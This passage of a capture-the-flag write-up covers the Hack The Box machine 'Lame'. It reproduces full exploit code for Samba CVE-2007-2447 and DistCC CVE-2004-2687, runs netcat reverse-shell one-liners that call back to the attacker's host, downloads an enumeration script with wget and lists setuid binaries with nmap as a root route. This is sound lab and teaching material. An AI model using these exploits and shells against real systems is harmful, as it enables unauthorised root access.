+		<span style="color:#66d9ef">super</span>(update_info(info,
+			<span style="color:#e6db74">&#39;Name&#39;</span>           <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Samba &#34;username map script&#34; Command Execution&#39;</span>,
+			<span style="color:#e6db74">&#39;Description&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">%q{
+</span><span style="color:#e6db74">					This module exploits a command execution vulerability in Samba
+</span><span style="color:#e6db74">				versions 3.0.20 through 3.0.25rc3 when using the non-default
+</span><span style="color:#e6db74">				&#34;username map script&#34; configuration option. By specifying a username
+</span><span style="color:#e6db74">				containing shell meta characters, attackers can execute arbitrary
+</span><span style="color:#e6db74">				commands.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">				No authentication is needed to exploit this vulnerability since
+</span><span style="color:#e6db74">				this option is used to map usernames prior to authentication!
+</span><span style="color:#e6db74">			}</span>,
+			<span style="color:#e6db74">&#39;Author&#39;</span>         <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;jduck&#39;</span> <span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;License&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">MSF_LICENSE</span>,
+			<span style="color:#e6db74">&#39;Version&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;$Revision: 10040 $&#39;</span>,
+			<span style="color:#e6db74">&#39;References&#39;</span>     <span style="color:#f92672">=&gt;</span>
+				<span style="color:#f92672">[</span>
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;CVE&#39;</span>, <span style="color:#e6db74">&#39;2007-2447&#39;</span> <span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;OSVDB&#39;</span>, <span style="color:#e6db74">&#39;34700&#39;</span> <span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;BID&#39;</span>, <span style="color:#e6db74">&#39;23972&#39;</span> <span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534&#39;</span> <span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;http://samba.org/samba/security/CVE-2007-2447.html&#39;</span> <span style="color:#f92672">]</span>
+				<span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;Platform&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;unix&#39;</span><span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;Arch&#39;</span>           <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">ARCH_CMD</span>,
+			<span style="color:#e6db74">&#39;Privileged&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>, <span style="color:#75715e"># root or nobody user</span>
+			<span style="color:#e6db74">&#39;Payload&#39;</span>        <span style="color:#f92672">=&gt;</span>
+				{
+					<span style="color:#e6db74">&#39;Space&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1024</span>,
+					<span style="color:#e6db74">&#39;DisableNops&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+					<span style="color:#e6db74">&#39;Compat&#39;</span>      <span style="color:#f92672">=&gt;</span>
+						{
+							<span style="color:#e6db74">&#39;PayloadType&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;cmd&#39;</span>,
+							<span style="color:#75715e"># *_perl and *_ruby work if they are installed</span>
+							<span style="color:#75715e"># mileage may vary from system to system..</span>
+						}
+				},
+			<span style="color:#e6db74">&#39;Targets&#39;</span>        <span style="color:#f92672">=&gt;</span>
+				<span style="color:#f92672">[</span>
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;Automatic&#34;</span>, { } <span style="color:#f92672">]</span>
+				<span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;DefaultTarget&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+			<span style="color:#e6db74">&#39;DisclosureDate&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;May 14 2007&#39;</span>))
+
+		register_options(
+			<span style="color:#f92672">[</span>
+				<span style="color:#66d9ef">Opt</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RPORT</span>(<span style="color:#ae81ff">139</span>)
+			<span style="color:#f92672">]</span>, self<span style="color:#f92672">.</span>class)
+	<span style="color:#66d9ef">end</span>
+
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>
+
+		connect
+
+		<span style="color:#75715e"># lol?</span>
+		username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/=`nohup &#34;</span> <span style="color:#f92672">+</span> payload<span style="color:#f92672">.</span>encoded <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;`&#34;</span>
+		<span style="color:#66d9ef">begin</span>
+			simple<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>negotiate(<span style="color:#66d9ef">false</span>)
+			simple<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>session_setup_ntlmv1(username, rand_text(<span style="color:#ae81ff">16</span>), datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SMBDomain&#39;</span><span style="color:#f92672">]</span>, <span style="color:#66d9ef">false</span>)
+		<span style="color:#66d9ef">rescue</span> <span style="color:#f92672">::</span><span style="color:#66d9ef">Timeout</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Error</span>, <span style="color:#66d9ef">XCEPT</span><span style="color:#f92672">::</span><span style="color:#66d9ef">LoginError</span>
+			<span style="color:#75715e"># nothing, it either worked or it didn&#39;t ;)</span>
+		<span style="color:#66d9ef">end</span>
+
+		handler
+	<span style="color:#66d9ef">end</span>
+
+<span style="color:#66d9ef">end</span>
+</code></pre></div><h2 id="exploitation">Exploitation</h2>
+<p>This is the most important line of the code, the moment the exploit sets and sends the payload.</p>
+<pre tabindex="0"><code>username = &#34;/=`nohup &#34; + payload.encoded + &#34;`&#34;
+</code></pre><p>This way, a reverse shell created by Metasploit is sent, but we can’t do so, so we are doing it manually, or firstly we can see how <a href="https://github.com/amriunix/CVE-2007-2447" target="_blank">this</a> exploit works.</p>
+<pre tabindex="0"><code>$ git clone https://github.com/amriunix/CVE-2007-2447
+</code></pre><h5 id="exploit-code-1">Exploit code:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> smb.SMBConnection <span style="color:#f92672">import</span> SMBConnection
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(rhost, rport, lhost, lport):
+        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mkfifo /tmp/hago; nc &#39;</span> <span style="color:#f92672">+</span> lhost <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> lport <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; 0&lt;/tmp/hago | /bin/sh &gt;/tmp/hago 2&gt;&amp;1; rm /tmp/hago&#39;</span>
+        username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/=`nohup &#34;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;`&#34;</span>
+        conn <span style="color:#f92672">=</span> SMBConnection(username, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+        <span style="color:#66d9ef">try</span>:
+            conn<span style="color:#f92672">.</span>connect(rhost, int(rport), timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">except</span>:
+            print <span style="color:#e6db74">&#39;[+] Payload was sent - check netcat !&#39;</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    print(<span style="color:#e6db74">&#39;[*] CVE-2007-2447 - Samba usermap script&#39;</span>)
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">5</span>:
+        print(<span style="color:#e6db74">&#34;[-] usage: python &#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;&#34;</span>)
+    <span style="color:#66d9ef">else</span>:
+        print(<span style="color:#e6db74">&#34;[+] Connecting !&#34;</span>)
+        rhost <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+        rport <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
+        lhost <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
+        lport <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">4</span>]
+        exploit(rhost, rport, lhost, lport)
+</code></pre></div><p>It basically automatize the connection asking for your IP and PORT in which a nc connection (for example) has to be open.</p>
+<p>Let’s try manually.</p>
+<pre tabindex="0"><code>$ python
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Python <span style="color:#ae81ff">2.7.17</span> (default, Oct <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">2019</span>, <span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">36</span>:<span style="color:#ae81ff">22</span>) 
+[GCC <span style="color:#ae81ff">9.2.1</span> <span style="color:#ae81ff">20191008</span>] on linux2
+Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> smb.SMBConnection <span style="color:#f92672">import</span> SMBConnection
+<span style="color:#f92672">&gt;&gt;&gt;</span> payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.X 9999 &gt;/tmp/f&#39;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/=`nohup &#34;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;`&#34;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> connection <span style="color:#f92672">=</span> SMBConnection(username, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+<span style="color:#f92672">&gt;&gt;&gt;</span> connection<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#34;10.10.10.3&#34;</span>,<span style="color:#ae81ff">445</span>)
+</code></pre></div><p>Before sending the last line (in which the connection is done and the payload sent by the username input), we should open a nc connection to receive the shell.</p>
+<pre tabindex="0"><code>$ nc -lnvp 9999
+</code></pre><p>When the last line is sent…</p>
+<pre tabindex="0"><code>Connection received on 10.10.10.3 42213
+sh: no job control in this shell
+sh-3.2$ id
+uid=0(root) gid=0(root)
+sh-3.2$ 
+</code></pre><p>Then, we might spawn a better shell by using python to spawn a full tty shell.</p>
+<pre tabindex="0"><code>$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><h2 id="post-exploitation">Post-Exploitation</h2>
+<p>We are root! Even though we don’t know yet whether we are inside a docker or a jail, we can assume there’s no post-exploitation because of the level of the machine and its ratings.</p>
+<p>We can now search for the flags.</p>
+<pre tabindex="0"><code>root@lame:/$ find / -name &#34;user.txt&#34; 2&gt; /dev/null
+./home/makis/user.txt
+root@lame:/$ find . -name &#34;root.txt&#34; 2&gt; /dev/null
+./root/root.txt
+</code></pre><p>Why searhing for it instead of going through /home and searching between the users?</p>
+<ul>
+<li>It is nice to practice <strong>find</strong> command and it can makes us faster grabbing flags or information.</li>
+</ul>
+<p>Why redirecting it to /dev/null?</p>
+<ul>
+<li>If we don’t do it, we will get tons of errors related to folders&#39; permissions. (In this case, there’s no folder root can’t access)</li>
+</ul>
+<h2 id="extra-research">Extra Research</h2>
+<p>Now that we are root we can research why this happens.</p>
+<h5 id="the-ms-rpc-functionality-in-smbd-in-samba-300-through-3025rc3-allows-remote-malicious-users-to-execute-arbitrary-commands-via-shell-metacharacters-involving-the-1-samrchangepassword-function-when-the-username-map-script-smbconf-option-is-enabled-and-allows-remote-authenticated-users-to-execute-commands-via-shell-metacharacters-involving-other-ms-rpc-functions-in-the-2-remote-printer-and-3-file-share-management-vulnmonhttpsvulmoncomvulnerabilitydetailsqidcve-2007-2447">“The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote malicious users to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the “username map script” smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.” <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2007-2447" target="_blank">vulnmon</a></h5>
+<pre tabindex="0"><code>cat /etc/samba/smb.conf | grep map
+username map script = /etc/samba/scripts/mapusers.sh
+</code></pre><h1 id="second-way">Second way</h1>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Taking into account that ssh is open too, another way must be possible.</p>
+<p>Let’s explore distccd.</p>
+<pre tabindex="0"><code>3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+</code></pre><p>After reading what it is (<a href="https://linux.die.net/man/1/distccd" target="_blank">here</a>, <a href="https://wiki.gentoo.org/wiki/Distcc" target="_blank">here</a>), maybe searchsploit has something interesting for us.</p>
+<pre tabindex="0"><code>$ searchsploit distcc
+</code></pre><pre tabindex="0"><code>----------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                               |  Path
+                                                                             | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+DistCC Daemon - Command Execution (Metasploit)                               | exploits/multiple/remote/9915.rb
+----------------------------------------------------------------------------- ----------------------------------------
+</code></pre><p>Mirroring it can help us understand its work flow.</p>
+<pre tabindex="0"><code>searchsploit -m exploits/multiple/remote/9915.rb
+</code></pre><h5 id="exploit-code-2">Exploit code:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;msf/core&#39;</span>
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Metasploit3</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span>
+	<span style="color:#66d9ef">Rank</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">ExcellentRanking</span>
+
+	<span style="color:#66d9ef">include</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Tcp</span>
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(info <span style="color:#f92672">=</span> {})
+		<span style="color:#66d9ef">super</span>(update_info(info,
+			<span style="color:#e6db74">&#39;Name&#39;</span>           <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;DistCC Daemon Command Execution&#39;</span>,
+			<span style="color:#e6db74">&#39;Description&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">%q{
+</span><span style="color:#e6db74">				This module uses a documented security weakness to execute
+</span><span style="color:#e6db74">				arbitrary commands on any system running distccd.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">			}</span>,
+			<span style="color:#e6db74">&#39;Author&#39;</span>         <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;hdm&#39;</span> <span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;License&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">MSF_LICENSE</span>,
+			<span style="color:#e6db74">&#39;Version&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;$Revision: 9669 $&#39;</span>,
+			<span style="color:#e6db74">&#39;References&#39;</span>     <span style="color:#f92672">=&gt;</span>
+				<span style="color:#f92672">[</span>
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;CVE&#39;</span>, <span style="color:#e6db74">&#39;2004-2687&#39;</span><span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;OSVDB&#39;</span>, <span style="color:#e6db74">&#39;13378&#39;</span> <span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;http://distcc.samba.org/security.html&#39;</span><span style="color:#f92672">]</span>,
+
+				<span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;Platform&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;unix&#39;</span><span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;Arch&#39;</span>           <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">ARCH_CMD</span>,
+			<span style="color:#e6db74">&#39;Privileged&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+			<span style="color:#e6db74">&#39;Payload&#39;</span>        <span style="color:#f92672">=&gt;</span>
+				{
+					<span style="color:#e6db74">&#39;Space&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1024</span>,
+					<span style="color:#e6db74">&#39;DisableNops&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+					<span style="color:#e6db74">&#39;Compat&#39;</span>      <span style="color:#f92672">=&gt;</span>
+						{
+							<span style="color:#e6db74">&#39;PayloadType&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;cmd&#39;</span>,
+							<span style="color:#e6db74">&#39;RequiredCmd&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;generic perl ruby bash telnet&#39;</span>,
+						}
+				},
+			<span style="color:#e6db74">&#39;Targets&#39;</span>        <span style="color:#f92672">=&gt;</span>
+				<span style="color:#f92672">[</span>
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;Automatic Target&#39;</span>, { }<span style="color:#f92672">]</span>
+				<span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;DefaultTarget&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+			<span style="color:#e6db74">&#39;DisclosureDate&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Feb 01 2002&#39;</span>
+			))
+
+			register_options(
+				<span style="color:#f92672">[</span>
+					<span style="color:#66d9ef">Opt</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RPORT</span>(<span style="color:#ae81ff">3632</span>)
+				<span style="color:#f92672">]</span>, self<span style="color:#f92672">.</span>class)
+	<span style="color:#66d9ef">end</span>
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>
+		connect
+
+		distcmd <span style="color:#f92672">=</span> dist_cmd(<span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, payload<span style="color:#f92672">.</span>encoded);
+		sock<span style="color:#f92672">.</span>put(distcmd)
+
+		dtag <span style="color:#f92672">=</span> rand_text_alphanumeric(<span style="color:#ae81ff">10</span>)
+		sock<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;DOTI0000000A</span><span style="color:#e6db74">#{</span>dtag<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+		res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">5</span>)
+
+		<span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span>(res <span style="color:#f92672">and</span> res<span style="color:#f92672">.</span>length <span style="color:#f92672">==</span> <span style="color:#ae81ff">24</span>)
+			print_status(<span style="color:#e6db74">&#34;The remote distccd did not reply to our request&#34;</span>)
+			disconnect
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#66d9ef">end</span>
+
+		<span style="color:#75715e"># Check STDERR</span>
+		res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>)
+		res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>)
+		len <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>res<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;H*&#34;</span>)<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;N&#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>
+
+		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> len
+		<span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+			res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(len, <span style="color:#ae81ff">5</span>)
+			res<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>line<span style="color:#f92672">|</span>
+				print_status(<span style="color:#e6db74">&#34;stderr: </span><span style="color:#e6db74">#{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+			<span style="color:#66d9ef">end</span>
+		<span style="color:#66d9ef">end</span>
+
+		<span style="color:#75715e"># Check STDOUT</span>
+		res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>)
+		res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>)
+		len <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>res<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;H*&#34;</span>)<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;N&#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>
+
+		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> len
+		<span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+			res <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(len, <span style="color:#ae81ff">5</span>)
+			res<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>line<span style="color:#f92672">|</span>
+				print_status(<span style="color:#e6db74">&#34;stdout: </span><span style="color:#e6db74">#{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+			<span style="color:#66d9ef">end</span>
+		<span style="color:#66d9ef">end</span>
+
+		handler
+		disconnect
+	<span style="color:#66d9ef">end</span>
+
+
+	<span style="color:#75715e"># Generate a distccd command</span>
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dist_cmd</span>(<span style="color:#f92672">*</span>args)
+
+		<span style="color:#75715e"># Convince distccd that this is a compile</span>
+		args<span style="color:#f92672">.</span>concat(<span style="color:#e6db74">%w{# -c main.c -o main.o}</span>)
+
+		<span style="color:#75715e"># Set distcc &#39;magic fairy dust&#39; and argument count</span>
+		res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DIST00000001&#34;</span> <span style="color:#f92672">+</span> sprintf(<span style="color:#e6db74">&#34;ARGC%.8x&#34;</span>, args<span style="color:#f92672">.</span>length)
+
+		<span style="color:#75715e"># Set the command arguments</span>
+		args<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>arg<span style="color:#f92672">|</span>
+			res <span style="color:#f92672">&lt;&lt;</span> sprintf(<span style="color:#e6db74">&#34;ARGV%.8x%s&#34;</span>, arg<span style="color:#f92672">.</span>length, arg)
+		<span style="color:#66d9ef">end</span>
+
+		<span style="color:#66d9ef">return</span> res
+	<span style="color:#66d9ef">end</span>
+
+<span style="color:#66d9ef">end</span>
+</code></pre></div><p>Another Metasploit module! Before exploring it, lets see if a non-metasploit one is on the internet.</p>
+<p>Seems there is a nmap script that can help us.</p>
+<pre tabindex="0"><code>$ ls -la /usr/share/nmap/scripts/*distcc*
+</code></pre><pre tabindex="0"><code>/usr/share/nmap/scripts/distcc-cve2004-2687.nse
+</code></pre><pre tabindex="0"><code>nmap -p 3632 --script distcc-cve2004-2687 --script-args=&#34;distcc-exec.cmd=&#39;id&#39;&#34; 10.10.10.3 -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 11:55 CET
+Nmap scan report for 10.10.10.3
+Host is up (0.072s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|       https://distcc.github.io/security.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+
+</code></pre><p>It worked! Now we could just use nmap to get a reverse shell or a pseudoshell.</p>
+<pre tabindex="0"><code>nmap -p 3632 --script distcc-cve2004-2687 --script-args=&#34;distcc-cve2004-2687.cmd=&#39;nc -e /bin/sh 10.10.14.X 9999&#39;&#34; 10.10.10.3 -Pn
+</code></pre><pre tabindex="0"><code>$ nc -lnvp 9999
+</code></pre><pre tabindex="0"><code>Connection received on 10.10.10.3 33430
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+</code></pre><p>Upgrading with python to a full tty shell allow us to start enumerating to escalate privileges.</p>
+<h2 id="post-exploitation-1">Post-Exploitation</h2>
+<p>I like using <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">this</a> script for privilege escalation checks.</p>
+<h5 id="sending-the-script-from-my-local-machine-to-the-box">Sending the script from my local machine to the box.</h5>
+<h5 id="local">(local)</h5>
+<pre tabindex="0"><code>$ python -m SimpleHTTPServer 80
+</code></pre><h5 id="box">(box)</h5>
+<pre tabindex="0"><code>$ wget http://10.10.14.X/lse.sh
+</code></pre><h5 id="local-1">(local)</h5>
+<pre tabindex="0"><code>10.10.10.3 - - [26/Dec/2019 12:08:56] &#34;GET /lse.sh HTTP/1.0&#34; 200 -
+</code></pre><h5 id="box-1">(box)</h5>
+<pre tabindex="0"><code>$ chmod +x lse.sh
+$ ./lse.sh -l2
+</code></pre><h2 id="first-way-of-privilege-escalation">First way of privilege escalation</h2>
+<pre tabindex="0"><code>[*] fst010 Binaries with setuid bit........................................ yes!
+---
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+/sbin/mount.nfs
+/lib/dhcp3-client/call-dhclient-script
+/usr/bin/sudoedit
+/usr/bin/X
+/usr/bin/netkit-rsh
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/netkit-rlogin
+/usr/bin/arping
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/nmap
+/usr/bin/chsh
+/usr/bin/netkit-rcp
+/usr/bin/passwd
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/lib/telnetlogin
+/usr/lib/apache2/suexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+
+</code></pre><p>This output is quite interesting as Nmap can be executed with root privileges and it has an interactive option that can spawn a shell.</p>
